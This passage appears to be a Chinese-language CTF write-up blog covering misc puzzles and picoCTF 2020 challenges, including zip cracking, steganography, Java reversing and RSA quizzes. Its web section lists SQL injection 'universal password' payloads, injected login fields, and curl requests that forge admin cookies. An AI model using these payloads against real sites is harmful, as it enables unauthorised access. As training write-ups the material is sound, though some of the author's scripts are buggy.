提交\n\n附件里有一名为222.zip的加密压缩包，通过ziperello暴力破解得密码723456\n得到名为111.zip的加密压缩包，其中存在flag.zip以及一提示文件头损坏的setup.sh\n\n上图为111.zip的二进制查看。常见的伪加密。504B0102 1400 1400 0000此处改为偶数即可。\nsetup.sh👇\n#!&#x2F;bin&#x2F;bash#zip -e --password&#x3D;&#96;python -c &quot;print(__import__(&#39;time&#39;).time())&quot;&#96; flag.zip flag\n按照提示执行这段代码\n&gt;python2 -c &quot;print(__import__(&#39;time&#39;).time())&quot;1610439451.64&gt;python2 -c &quot;print(__import__(&#39;time&#39;).time())&quot;1610439453.74&gt;python2 -c &quot;print(__import__(&#39;time&#39;).time())&quot;1610439472.66\n可看出跟时间戳有关（python3执行有精度差异\n&gt;python3 -c &quot;print(__import__(&#39;time&#39;).time())&quot;1610439561.7353652\n对flag.zip进行掩码爆破（出题时时间戳比已知的数字小，至于小多少就自行猜测了\n\n密码1558080832.15\nflag&#123;fkjabPqnLawhvuikfhgzyffj&#125;\n15\n\n\n得到的 flag 请包上 flag{} 提交。\n感谢天璇战队供题。\n天璇战队平台：http://ctf.merak.codes/\n\n这道题算是能得到锻炼的好题叭\n首先是套娃解zip，名字就是下一层的密码：\nimport zipfile,osdef unzip(zipname):    while True:        passwd &#x3D; zipname.split(&#39;.&#39;)[0]        zf &#x3D; zipfile.ZipFile(zipname,&#39;r&#39;)        zf.extractall(pwd&#x3D;passwd.encode())        zf.close()        os.remove(zipname)        zipname &#x3D; zf.namelist()[0]        zf.close()unzip(&quot;0573.zip&quot;)\n得到qr.txt：40000行格式为\n(255, 255, 255)\n不难想到是RGB成像。\n40000=200*200\n修改手头脚本：\nfrom PIL import Imagex &#x3D; y &#x3D; 200img &#x3D; Image.new(&quot;RGB&quot;,(x,y))file &#x3D; open(&#39;qr.txt&#39;,&#39;r&#39;)for width in range(0,x):    for height in range(0,y):        line &#x3D; file.readline()        print line        if(line[1:2] &#x3D;&#x3D; &#39;2&#39;):            rgbs &#x3D; line[1:4]+&#39;,&#39;+line[6:9]+&#39;,&#39;+line[11:14]        if(line[1:2] &#x3D;&#x3D; &#39;0&#39;):            rgbs &#x3D; line[1:2] +&#39;,&#39;+ line[4:5] +&#39;,&#39;+ line[7:8]        rgb &#x3D; rgbs.split(&#39;,&#39;)        img.putpixel((width,height),(int(rgb[0]),int(rgb[1]),int(rgb[2])))img.save(&#39;rgb.jpg&#39;)\n得到一张二维码。扫码得\nMRCTF&#123;ta01uyout1nreet1n0usandtimes&#125;\n\n调通脚本的过程真是太有成就感了\n\n16\n\n\n一不小心把存放flag的二维码给撕破了，各位大侠帮忙想想办法吧 注意：得到的 flag 请包上 flag{} 提交\n\n我爱PS（当然不可能了：）\n修了半天依然不能识别，于是还是手拼叭淦\n\n17\n\n\n得到的 flag 请包上 flag{} 提交。\n感谢 Iven Huang 师傅供题。\n比赛平台：https://ctfgame.w-ais.cn/\n\n有一说一，在做了上一题的死亡二维码后，看到这道题的头都大了。\n无后缀名的文件-》查看二进制-》.pdf-》提示flag在图片后面-》转word-》移动图片无发现-》.zip-&gt;查看word/media-》得到两张图片\n一张是已知的【爬】，一张就是出题人想隐藏的\n\n手输十六进制\n77637466323032307b746831735f31735f405f7064665f616e645f7930755f63616e5f7573655f70686f7430736830707d\nwctf2020&#123;th1s_1s_@_pdf_and_y0u_can_use_phot0sh0p&#125;\n\n看来出题人是想让咱们通过PS将pdf转换成word，这是笔者目前不会的，望告知（目前笔者用的是【迅读PDF大师】\n\n18\n\n\n得到的 flag 请包上 flag{} 提交。\n感谢天璇战队供题。\n天璇战队平台：http://ctf.merak.codes/\n\nexe运行起来后👇\nI love cyberpunk2077!It will on 2020.9.17Since it has been open,I will give you the flag\n修改系统时间即可\nMRCTF&#123;We1cOm3_70_cyber_security&#125;每隔10s刷新一次当前时间:月: 9日: 17\n19\n\n\n得到的 flag 请包上 flag{} 提交。\n\n一道平平无奇的脚本题\n63 127 255 通过进制转换联想到00 01 10 11\nf &#x3D; open(&quot;attachment.txt&quot;, &quot;r&quot;)s &#x3D; &#39;&#39;tmp &#x3D; &#39;&#39;while 1:    num &#x3D; f.readline()    if not num:        break    if num.rstrip() &#x3D;&#x3D; &#39;63&#39;:        tmp &#x3D; &#39;00&#39;    elif num.rstrip() &#x3D;&#x3D; &#39;127&#39;:        tmp &#x3D; &#39;01&#39;    elif num.rstrip() &#x3D;&#x3D; &#39;191&#39;:        tmp &#x3D; &#39;10&#39;    elif num.rstrip() &#x3D;&#x3D; &#39;255&#39;:        tmp &#x3D; &#39;11&#39;    s +&#x3D; tmpprint s\n转十六进制\nnumber &#x3D; &#39;&#39;for i in range(0, len(s), 8):    number +&#x3D; chr(int(s[i:i + 8], 2))print numberf2 &#x3D; open(&#39;1.zip&#39;, &#39;w&#39;)f2.write(number.decode(&#39;hex&#39;))f2.close()\n得到1.zip（通过number能看出该文本为压缩包的二进制\n压缩包内有flag.txt，内容为多重base64加密\n解码得flag\nflag&#123;189ff9e5b743ae95f940a6ccc6dbd9ab&#125;\n20\n\n\n得到的 flag 请包上 flag{} 提交。\n\n真实的压缩包.zip和虚假的压缩包.zip\n不得不说，虽然360会忽略掉很多本该被注意的错误，但是有的时候还是很有用的（比如伪加密\n直接用360可打开【虚假的压缩包.zip】\n数学题n &#x3D; 33e &#x3D; 3解26-------------------------答案是\n简单的RSA\n答案是5\n解开真实的压缩包\n一张图和一个文件\n图平平无奇，用到的是misc入门方法，更改高度，得到提示【^5】\n\n【亦真亦假】里是一串无意义数字\n与5异或\noriginal &#x3D; open(&quot;亦真亦假&quot;,&#39;r&#39;).read()flag &#x3D; open(&quot;flag&quot;,&#39;w&#39;)for i in original:    tmp &#x3D; int(i,16)^5    flag.write(hex(tmp)[2:])\n得到504B0304为首的字符，更改后缀名为.zip后，能看到这是个word。更改后缀名为.docx\n得到一篇文章。\n\n通过空格的位置，全选上色，得flag\nFLAG&#123;_th2_7ru8_2iP_&#125;\n","tags":["MISC"]},{"title":"picoCTF2020","url":"/2021/03/22/picoCTF2020/","content":"Forensics\n\nGlory of the Garden\n\n\n\nWhat is a hex editor?\n\n\n根据hint，拖进winhex，最后可得flag.\nshark on wire 1\n\nshark on wire 1\n\nTry using a tool like Wireshark;What are streams?\n\n\n追踪UDP流，得flag。（MISC-AboutWireshark.md里编写了类似的思路）\n\n\nHow do operating systems know what kind of file it is? (It’s not just the ending!Make sure to submit the flag as picoCTF{XXXXX}\n\n直接打开是一txt文件，观察可指为png的文件格式，更改后缀名可得flag.\nSo Meta\n\n\n\nWhat does meta mean in the context of files?Ever heard of metadata?\n\n\n同第一题，Winhex打开搜索关键词得flag.\nWhat Lies Within\n\n\n\nThere is data encoded somewhere… there might be an online decoder.\n\n\n图片隐写在线网站可得，工具get\n\n\nI stopped using YellowPages and moved onto WhitePages… but the page they gave me is all blank!\n\n#coding&#x3D;utf-8text&#x3D;&#39;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                &#39;firstType &#x3D; &#39; &#39;secondType &#x3D;  &#39; &#39;binaryString &#x3D; &#39;&#39;for char in text: #Foreach char    if char &#x3D;&#x3D; firstType: #Check if it is the first type        binaryString +&#x3D; &#39;0&#39; #Mark it as 0    else:        binaryString +&#x3D; &#39;1&#39; #Mark it as 1print(binaryString) #Print result\nm00nwalk2\n\nMISC-audio.md 中有提及。\n\nlike1000\n\n[like1000](This .tar file got tarred a lot.)\n\nTry and script this, it’ll save you a lot of time\n\n\nimport tarfilefor i in range(1000,1,-1):    filename&#x3D;str(i)+&#39;.tar&#39;    tar&#x3D;tarfile.open(filename)    tar.extractall()    tar.close\nWebNet0\n学到一招，更新在（MISC-AboutWireshark.md 中）\nWeb Exploitation\n\n\n\nHow do you inspect web code on a browser?There’s 3 parts\n\nctrl+u看源码-&gt;1/3 of the flag: picoCTF{tru3_d3\nmycss.css看源码-&gt; 2/3 of the flag: t3ct1ve_0r_ju5t\nmyjs.js看源码-&gt;3/3 of the flag: _lucky?2e7b23e3}\n\n\nWhat part of the website could tell you where the creator doesn’t want you to look?\n\n提到robots,输入/robots.txt\n得👇\nUser-agent: *Disallow: &#x2F;1bb4c.html\n输入/1bb4c.html\n得flag.\n\n\nNever trust the client\n\n看源码\nfunction verify() &#123;    checkpass &#x3D; document.getElementById(&quot;pass&quot;).value;    split &#x3D; 4;    if (checkpass.substring(0, split) &#x3D;&#x3D; &#39;pico&#39;) &#123;      if (checkpass.substring(split*6, split*7) &#x3D;&#x3D; &#39;706c&#39;) &#123;        if (checkpass.substring(split, split*2) &#x3D;&#x3D; &#39;CTF&#123;&#39;) &#123;         if (checkpass.substring(split*4, split*5) &#x3D;&#x3D; &#39;ts_p&#39;) &#123;          if (checkpass.substring(split*3, split*4) &#x3D;&#x3D; &#39;lien&#39;) &#123;            if (checkpass.substring(split*5, split*6) &#x3D;&#x3D; &#39;lz_b&#39;) &#123;              if (checkpass.substring(split*2, split*3) &#x3D;&#x3D; &#39;no_c&#39;) &#123;                if (checkpass.substring(split*7, split*8) &#x3D;&#x3D; &#39;5&#125;&#39;) &#123;                  alert(&quot;Password Verified&quot;)                  &#125;                &#125;              &#125;                  &#125;          &#125;        &#125;      &#125;    &#125;    else &#123;      alert(&quot;Incorrect password&quot;);    &#125;      &#125;\n读代码，根据下标拼接flag。\n\n\nHmm it doesn’t seem to check anyone’s password, except for logon’s?\n\n根据提示，用logon登录后，什么都没有。但EditThisCookie中观察，多了admin的选项，将admin由False改为True后，加锁，加路径后，刷新即可得flag。👇\n\n\n\nWhat is obfuscation?\n\n\n\nCan cookies help you to get the flag?\n\n了解了传COOKIES的另一种方式：\ncurl &quot;https:&#x2F;&#x2F;jupiter.challenges.picoctf.org&#x2F;problem&#x2F;51400&#x2F;&quot; -H &quot;Cookie:admin&#x3D;True;time&#x3D;1400;&quot; -s\n以及\ngrep picoCTF\n来搜索关键词。\n\n\nYou don’t need to download a new web browser\n\ncurl --user-agent &quot;picobrowser&quot; &quot;https:&#x2F;&#x2F;jupiter.challenges.picoctf.org&#x2F;problem&#x2F;13759&#x2F;flag&quot; | grep picoCTF\n得flag所在的那一行。\n\n\nThere doesn’t seem to be many ways to interact with this. I wonder if the users are kept in a database?Try to think about how the website verifies your login.\n\n由这道题了解到了网络后台的万能密码，\n&quot;or &quot;a&quot;&#x3D;&quot;a&#39;)or(&#39;a&#39;&#x3D;&#39;aor 1&#x3D;1--&#39;or 1&#x3D;1--a&#39;or&#39; 1&#x3D;1--&quot;or 1&#x3D;1--&#39;or&#39;a&#39;&#x3D;&#39;a&quot;or&quot;&#x3D;&quot;a&#39;&#x3D;&#39;a&#39;or&#39;&#39;&#x3D;&#39;&#39;or&#39;&#x3D;&#39;or&#39;1 or &#39;1&#39;&#x3D;&#39;1&#39;&#x3D;11 or &#39;1&#39;&#x3D;&#39;1&#39; or 1&#x3D;1&#39;OR 1&#x3D;1&quot;or 1&#x3D;1&#39;xor\n简单来说就是在自己需要传输的命令后添加一个恒为真的值来保证执行。学到了。\n由此可知该题可输入的命令为\ndebug&#x3D;1&amp;password&#x3D;&amp;username&#x3D;admin&#39; or &#39;1&#39;&#x3D;&#x3D;&#39;1\nusername: admin&#39; or &#39;1&#39;&#x3D;&#x3D;&#39;1password: SQL query: SELECT * FROM users WHERE name&#x3D;&#39;admin&#39; or &#39;1&#39;&#x3D;&#x3D;&#39;1&#39; AND password&#x3D;&#39;&#39;\n得到flag.\n\n\nThe password is being filtered.\n\ndebug&#x3D;1&amp;password&#x3D;1&amp;username&#x3D;admin&#39;--\nusername: admin&#39;--password: 1SQL query: SELECT * FROM users WHERE name&#x3D;&#39;admin&#39;--&#39; AND password&#x3D;&#39;1&#39;\n\n\nSeems like the password is encrypted.\n\n尝试\ndebug&#x3D;1&amp;password&#x3D;adsf\n发现回显\npassword: adsfSQL query: SELECT * FROM admin where password &#x3D; &#39;nqfs&#39;\n与输入不同，可知该程序对输入值进行了某种加密。观察可得为ROT13解码，故我们可以通过ROT13加密的方式传入我们的命令。\ndebug&#x3D;1&amp;password&#x3D;&#39; BE &#39;1&#39;&#x3D;&#39;1\n得\npassword: &#39; BE &#39;1&#39;&#x3D;&#39;1SQL query: SELECT * FROM admin where password &#x3D; &#39;&#39; OR &#39;1&#39;&#x3D;&#39;1&#39;\n得flag.\nReverse Engineering\n\nvault-door-training\n\n[vault-door-training](Your mission is to enter Dr. Evil’s laboratory and retrieve the blueprints for his Doomsday Project. The laboratory is protected by a series of locked vault doors. Each door is controlled by a computer and requires a password to open. Unfortunately, our undercover agents have not been able to obtain the secret passwords for the vault doors, but one of our junior agents obtained the source code for each vault’s computer! You will need to read the source code for each level to figure out what the password is for that vault door. As a warmup, we have created a replica vault in our training facility. The source code for the training vault is here: VaultDoorTraining.java)\n\nThe password is revealed in the program’s source code.\n\n\n读脚本即可解。\nString input &#x3D; userInput.substring(&quot;picoCTF&#123;&quot;.length(),userInput.length()-1);public boolean checkPassword(String password) &#123;        return password.equals(&quot;w4rm1ng_Up_w1tH_jAv4_3808d338b46&quot;);    &#125;\nvault-door-1\n\n[vault-door-1](This vault uses some complicated arrays! I hope you can make sense of it, special agent. The source code for this vault is here: VaultDoor1.java)\n\nLook up the charAt() method online.\n\n\n根据数组下标依次串联可得flag。\nvault-door-3\n\n[vault-door-3](This vault uses for-loops and byte arrays. The source code for this vault is here: VaultDoor3.java)\n\nMake a table that contains each value of the loop variables and the corresponding buffer index that it writes to.\n\n\npublic boolean checkPassword(String password) &#123;        if (password.length() !&#x3D; 32) &#123;            return false;        &#125;        char[] buffer &#x3D; new char[32];        int i;        for (i&#x3D;0; i&lt;8; i++) &#123;            buffer[i] &#x3D; password.charAt(i);        &#125;        for (; i&lt;16; i++) &#123;            buffer[i] &#x3D; password.charAt(23-i);        &#125;        for (; i&lt;32; i+&#x3D;2) &#123;            buffer[i] &#x3D; password.charAt(46-i);        &#125;        for (i&#x3D;31; i&gt;&#x3D;17; i-&#x3D;2) &#123;            buffer[i] &#x3D; password.charAt(i);        &#125;        String s &#x3D; new String(buffer);        return s.equals(&quot;jU5t_a_sna_3lpm12g94c_u_4_m7ra41&quot;);    &#125;\n理解脚本逻辑，明确\n-密文长度为32位\n-依次取s中的对应位数\n-串联得flag\nvault-door-4\n\n[vault-door-4](This vault uses ASCII encoding for the password. The source code for this vault is here: VaultDoor4.java)\n\nUse a search engine to find an “ASCII table”.\nYou will also need to know the difference between octal, decimal, and hexadecimal numbers.\n\n\npublic boolean checkPassword(String password) &#123;        byte[] passBytes &#x3D; password.getBytes();        byte[] myBytes &#x3D; &#123;            106 , 85  , 53  , 116 , 95  , 52  , 95  , 98  ,            0x55, 0x6e, 0x43, 0x68, 0x5f, 0x30, 0x66, 0x5f,            0142, 0131, 0164, 063 , 0163, 0137, 0146, 064 ,            &#39;a&#39; , &#39;8&#39; , &#39;c&#39; , &#39;d&#39; , &#39;8&#39; , &#39;f&#39; , &#39;7&#39; , &#39;e&#39; ,        &#125;;        for (int i&#x3D;0; i&lt;32; i++) &#123;            if (passBytes[i] !&#x3D; myBytes[i]) &#123;                return false;            &#125;        &#125;        return true;    &#125;\n依次对数组中的数据进行处理，分别为ASCII,十六进制，八进制与原字母，串联得flag.\nvault-door-5\n\n[vault-door-5](In the last challenge, you mastered octal (base 8), decimal (base 10), and hexadecimal (base 16) numbers, but this vault door uses a different change of base as well as URL encoding! The source code for this vault is here: VaultDoor5.java)\n\nYou may find an encoder/decoder tool helpful, such as https://encoding.tools/;Read the wikipedia articles on URL encoding and base 64 encoding to understand how they work and what the results look like.\n\n\npublic String urlEncode(byte[] input) &#123;        StringBuffer buf &#x3D; new StringBuffer();        for (int i&#x3D;0; i&lt;input.length; i++) &#123;            buf.append(String.format(&quot;%%%2x&quot;, input[i]));        &#125;        return buf.toString();    &#125;public boolean checkPassword(String password) &#123;        String urlEncoded &#x3D; urlEncode(password.getBytes());        String base64Encoded &#x3D; base64Encode(urlEncoded.getBytes());        String expected &#x3D; &quot;JTYzJTMwJTZlJTc2JTMzJTcyJTc0JTMxJTZlJTY3JTVm&quot;                        + &quot;JTY2JTcyJTMwJTZkJTVmJTYyJTYxJTM1JTY1JTVmJTM2&quot;                        + &quot;JTM0JTVmJTM4JTM0JTY2JTY0JTM1JTMwJTM5JTM1&quot;;        return base64Encoded.equals(expected);    &#125;\n将expected中得字符串联后，base64解密后，URL解密得flag。\nvault-door-6\n\n[vault-door-6](This vault uses an XOR encryption scheme. The source code for this vault is here: VaultDoor6.java)\n\nIf X ^ Y = Z, then Z ^ Y = X. Write a program that decrypts the flag based on this fact.\n\n\n根据HINT，可知该题与异或有关，转二进制后编写脚本（以下为笔者的辣鸡脚本）\nmodetext&#x3D;&#39;01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010&#39;plaintext&#x3D;&#39;0011101101100101001000011010000000111000000000000011011000011101101000000011110101100001001001110001000101100110001001111010000000100001000111010110000100111011101000000010110101100101001001111010000001100110001101100011000001100111011011000110010001101100&#39;plain&#x3D;plaintext.replace(&#39; &#39;, &#39;&#39;)mode&#x3D;modetext.replace(&#39; &#39;,&#39;&#39;)print(mode)new&#x3D;&#39;&#39;for i in range(0,len(plain)):    if(plain[i]&#x3D;&#x3D;&#39;0&#39;):        new +&#x3D; mode[i]    elif(plain[i]&#x3D;&#x3D;&#39;1&#39;):        new +&#x3D; str(1-int(mode[i]))print(new)print(plain)\n二进制转字符后得flag.\nvault-door-7\n\n[vault-door-7](This vault uses bit shifts to convert a password string into an array of integers. Hurry, agent, we are running out of time to stop Dr. Evil’s nefarious plans! The source code for this vault is here: VaultDoor7.java)\n\nUse a decimal/hexadecimal converter such as this one: https://www.mathsisfun.com/binary-decimal-hexadecimal-converter.html;You will also need to consult an ASCII table such as this one: https://www.asciitable.com/\n\n\n笔者的脚本\nx&#x3D;0x[0] &#x3D;1096770097x[1] &#x3D;1952395366x[2] &#x3D;1600270708x[3] &#x3D;1601398833x[4] &#x3D;1716808014x[5] &#x3D;1734293296x[6] &#x3D;842413104x[7] &#x3D;1684157793before&#x3D;&#39;&#39;for i in range(0,8):    before[i]&#x3D;x[i*4]&gt;&gt;24|x[i*4+1]&gt;&gt;16|x[i*4+2]&gt;&gt;8|x[i*4+3]    print(before)\n\n\n做了一连串RE题之后对编写脚本和逆向增加了一定的了解。挺好。\n\n\nGeneral Skills\n\n2Warm\n\n[2Warm]\n\nCan you convert the number 42 (base 10) to binary (base 2)?\n\n\n十进制42转二进制，在线网站即可。\nWarmed Up\n\n[Warmed Up]\n\nWhat is 0x3D (base 16) in decimal (base 10)?\n\n\n十六进制转十进制，同上\nLets Warm Up\n\n[Lets Warm Up]\n\nIf I told you a word started with 0x70 in hexadecimal, what would it start with in ASCII?\n\n\n十六进制转ASCII，同上\n*strings it *\n\n[strings it ]\n\nCan you find the flag in file without running it?\n\n\n执行命令\nstrings XXX | grep picoCTF\n得关键词。\nBases\n\n[Bases]\n\nWhat does this bDNhcm5fdGgzX3IwcDM1 mean? I think it has something to do with bases.\n\n\nBase一把梭寻找可能字符串。\nFirst Grep\n\n[First Grep]\n\nCan you find the flag in file? This would be really tedious to look through manually, something tells me there is a better way.\n\n\n直接打开可得flag.\nwhat’s a net cat?\n\n[what’s a net cat?]\n\nUsing netcat (nc) is going to be pretty important. Can you connect to jupiter.challenges.picoctf.org at port 29138 to get the flag?\n\n\nnc jupiter.challenges.picoctf.org 29138\nplumbing\n\n[plumbing]\n\nSometimes you need to handle process data outside of a file. Can you find a way to keep the output from this program and search for the flag? Connect to jupiter.challenges.picoctf.org 22058.\n\n\nnc jupiter.challenges.picoctf.org 22058 |grep picoCTF\n同前题\nBased\n\n[Based]\n\nTo get truly 1337, you must understand different data encodings, such as hexadecimal or binary. Can you get the flag from this program to prove you are on the way to becoming 1337? Connect with nc jupiter.challenges.picoctf.org 9670.\n\n\n# nc jupiter.challenges.picoctf.org 9670Let us see how data is storedpiePlease give the 01110000 01101001 01100101 as a word....you have 45 seconds.....Input:piePlease give me the  163 157 143 153 145 164 as a word.Input:socketPlease give me the 636f6c6f7261646f as a word.Input:coloradoYou&#39;ve beaten the challengeFlag: picoCTF&#123;learning_about_converting_values_b375bb16&#125;\n二进制八进制十六进制转换。\nmus1c\n\n[mus1c](I wrote you a song. Put it in the picoCTF{} flag format.)\n\nDo you think you can master rockstar?\n\n\nPico&#39;s a CTFFFFFFFmy mind is waitinIt&#39;s waitinPut my mind of Pico into Thismy flag is not foundput This into my flagput my flag into Picoshout Picoshout Picoshout PicoMy song&#39;s somethingput Pico into ThisKnock This down, down, downput This into CTFshout CTFmy lyric is nothingPut This without my song into my lyricKnock my lyric down, down, downshout my lyricPut my lyric into ThisPut my song with This into my lyricKnock my lyric downshout my lyricBuild my lyric up, up ,upshout my lyricshout Picoshout ItPico CTF is funsecurity is importantFun is funPut security with fun into Pico CTFBuild Fun upshout fun times Pico CTFput fun times Pico CTF into my songbuild it upshout itshout itbuild it up, upshout itshout Pico\n根据hint搜索rockstar,得一在线网站，解密得\n1141141141119910711011411048494951114Program completed in 361 ms\n转ASCII得flag.\n1_wanna_b3_a_r0ck5tar\n\n[1_wanna_b3_a_r0ck5tar]\n\nI wrote you another song. Put the flag in the picoCTF{} flag format\n\n\n上题的方法失败读脚本通过\nRocknroll is right              Silence is wrong                A guitar is a six-string \n等，猜测为类似伪代码，更改运行可得flag.\nCryptography\n\nThe Numbers\n\nThe Numbers\n\nThe flag is in the format PICOCTF{}\n\n\n得到一串数字\n16 9 3 15 3 20 6 &#123; 20 8 5 14 21 13 2 5 18 19 13 1 19 15 14 &#125;\n根据hint，对照ASCII，已知部门为\n80 73 67 79 67 84 70 &#123; &#125;\n编写脚本，思路为after=before+64，或者手动加工也可得到flag.\ncaesar\n\ncaesar\n\ncaesar cipher tutorial\n\n\n在线网站或者脚本都可解密，遍历后选取相对有意思的字符即是flag.\nEasy1\n\nEasy1\n\nThe one time pad can be cryptographically secure, but not when you know the key. Can you solve this? We’ve given you the encrypted flag, key, and a table to help UFJKXQZQUNB with the key of SOLVECRYPTO. Can you use this table to solve it?.\n\n\n\n\nSubmit your answer in our flag format. For example, if your answer was ‘hello’, you would submit ‘picoCTF{HELLO}’ as the flag.Please use all caps for the message.\n\n\n据题意，已知该加密方式拥有明文和密钥，结合给出的字典，确定为维吉尼亚编码，在线网站或脚本都可解密得flag。\n13\n\n[13](Cryptography can be easy, do you know what ROT13 is? cvpbPGS{abg_gbb_onq_bs_n_ceboyrz})\n\nThis can be solved online if you don’t want to do it by hand!\n\n\n题目描述可知加密方式为ROT13,在线网站或脚本即可解密。\nla cifra de\n\n[la cifra de](I found this cipher in an old book. Can you figure out what it says? Connect with nc jupiter.challenges.picoctf.org 50523)\n\nThere are tools that make this easy.Perhaps looking at history will help\n\n\nEncrypted message:Ne iy nytkwpsznyg nth it mtsztcy vjzprj zfzjy rkhpibj nrkitt ltc tnnygy ysee itd tte cxjltkIfrosr tnj noawde uk siyyzre, yse Bnretèwp Cousex mls hjpn xjtnbjytki xatd eisjdIz bls lfwskqj azycihzeej yz Brftsk ip Volpnèxj ls oy hay tcimnyarqj dkxnrogpd os 1553 my Mnzvgs Mazytszf Merqlsu ny hox moup Wa inqrg ipl. Ynr. Gotgat Gltzndtg Gplrfdo Ltc tnj tmvqpmkseaznzn uk ehox nivmpr g ylbrj ts ltcmki my yqtdosr tnj wocjc hgqq ol fy oxitngwj arusahje fuw ln guaaxjytrd catizm tzxbkw zf vqlckx hizm ceyupcz yz tnj fpvjc hgqqpohzCZK&#123;m311a50_0x_a1rn3x3_h1ah3x6kp60egf&#125;Ehk ktryy herq-ooizxetypd jjdcxnatoty ol f aordllvmlbkytc inahkw socjgex, bls sfoe gwzuti 1467 my Rjzn Hfetoxea Gqmexyt.Tnj Gimjyèrk Htpnjc iy ysexjqoxj dosjeisjd cgqwej yse Gqmexyt Doxn ox Fwbkwei Inahkw.Tn 1508, Ptsatsps Zwttnjxiax tnbjytki ehk xz-cgqwej ylbaql rkhea (g rltxni ol xsilypd gqahggpty) ysaz bzuri wazjc bk f nroytcgq nosuznkse ol yse Bnretèwp Cousex.Gplrfdo’y xpcuso butvlky lpvjlrki tn 1555 gx l cuseitzltoty ol yse lncsz. Yse rthex mllbjd ol yse gqahggpty fce tth snnqtki cemzwaxqj, bay ehk fwpnfmezx lnj yse osoed qptzjcs gwp mocpd hd xegsd ol f xnkrznoh vee usrgxp, wnnnh ify bk itfljcety hizm paim noxwpsvtydkse.\n在线网站维吉尼亚解密可得flag.\n\n词频分析搞了半天，555\n\nrsa-pop-quiz\n\n[rsa-pop-quiz](Class, take your seats! It’s PRIME-time for a quiz… nc jupiter.challenges.picoctf.org 41130)\n\nRSA info\n\n\nRSA层层解密：\n# nc jupiter.challenges.picoctf.org 41130Good morning class! It&#39;s me Ms. Adleman-Shamir-RivestToday we will be taking a pop quiz, so I hope you studied. Cramming just will not do!You will need to tell me if each example is possible, given your extensive crypto knowledge.Inputs and outputs are in decimal. No hex here!#### NEW PROBLEM ####q : 60413p : 76753##### PRODUCE THE FOLLOWING ####nIS THIS POSSIBLE and FEASIBLE? (Y&#x2F;N):y#### TIME TO SHOW ME WHAT YOU GOT! ###n: 4636878989Outstanding move!!!#### NEW PROBLEM ####p : 54269n : 5051846941##### PRODUCE THE FOLLOWING ####qIS THIS POSSIBLE and FEASIBLE? (Y&#x2F;N):y#### TIME TO SHOW ME WHAT YOU GOT! ###q: 93089Outstanding move!!!#### NEW PROBLEM ####e : 3n : 12738162802910546503821920886905393316386362759567480839428456525224226445173031635306683726182522494910808518920409019414034814409330094245825749680913204566832337704700165993198897029795786969124232138869784626202501366135975223827287812326250577148625360887698930625504334325804587329905617936581116392784684334664204309771430814449606147221349888320403451637882447709796221706470239625292297988766493746209684880843111138170600039888112404411310974758532603998608057008811836384597579147244737606088756299939654265086899096359070667266167754944587948695842171915048619846282873769413489072243477764350071787327913##### PRODUCE THE FOLLOWING ####qpIS THIS POSSIBLE and FEASIBLE? (Y&#x2F;N):nOutstanding move!!!#### NEW PROBLEM ####q : 66347p : 12611##### PRODUCE THE FOLLOWING ####totient(n)IS THIS POSSIBLE and FEASIBLE? (Y&#x2F;N):y#### TIME TO SHOW ME WHAT YOU GOT! ###totient(n): 836623060Outstanding move!!!#### NEW PROBLEM ####plaintext : 6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717e : 3n : 29129463609326322559521123136222078780585451208149138547799121083622333250646678767769126248182207478527881025116332742616201890576280859777513414460842754045651093593251726785499360828237897586278068419875517543013545369871704159718105354690802726645710699029936754265654381929650494383622583174075805797766685192325859982797796060391271817578087472948205626257717479858369754502615173773514087437504532994142632207906501079835037052797306690891600559321673928943158514646572885986881016569647357891598545880304236145548059520898133142087545369179876065657214225826997676844000054327141666320553082128424707948750331##### PRODUCE THE FOLLOWING ####ciphertextIS THIS POSSIBLE and FEASIBLE? (Y&#x2F;N):y#### TIME TO SHOW ME WHAT YOU GOT! ###ciphertext: 256931246631782714357241556582441991993437399854161372646318659020994329843524306570818293602492485385337029697819837182169818816821461486018802894936801257629375428544752970630870631166355711254848465862207765051226282541748174535990314552471546936536330397892907207943448897073772015986097770443616540466471245438117157152783246654401668267323136450122287983612851171545784168132230208726238881861407976917850248110805724300421712827401063963117423718797887144760360749619552577176382615108244813Outstanding move!!!#### NEW PROBLEM ####ciphertext : 107524013451079348539944510756143604203925717262185033799328445011792760545528944993719783392542163428637172323512252624567111110666168664743115203791510985709942366609626436995887781674651272233566303814979677507101168587739375699009734588985482369702634499544891509228440194615376339573685285125730286623323e : 3n : 27566996291508213932419371385141522859343226560050921196294761870500846140132385080994630946107675330189606021165260590147068785820203600882092467797813519434652632126061353583124063944373336654246386074125394368479677295167494332556053947231141336142392086767742035970752738056297057898704112912616565299451359791548536846025854378347423520104947907334451056339439706623069503088916316369813499705073573777577169392401411708920615574908593784282546154486446779246790294398198854547069593987224578333683144886242572837465834139561122101527973799583927411936200068176539747586449939559180772690007261562703222558103359##### PRODUCE THE FOLLOWING ####plaintextIS THIS POSSIBLE and FEASIBLE? (Y&#x2F;N):nOutstanding move!!!#### NEW PROBLEM ####q : 92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559p : 97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637e : 65537##### PRODUCE THE FOLLOWING ####dIS THIS POSSIBLE and FEASIBLE? (Y&#x2F;N):y#### TIME TO SHOW ME WHAT YOU GOT! ###d: 1405046269503207469140791548403639533127416416214210694972085079171787580463776820425965898174272870486015739516125786182821637006600742140682552321645503743280670839819078749092730110549881891271317396450158021688253989767145578723458252769465545504142139663476747479225923933192421405464414574786272963741656223941750084051228611576708609346787101088759062724389874160693008783334605903142528824559223515203978707969795087506678894006628296743079886244349469131831225757926844843554897638786146036869572653204735650843186722732736888918789379054050122205253165705085538743651258400390580971043144644984654914856729Outstanding move!!!#### NEW PROBLEM ####p : 153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433ciphertext : 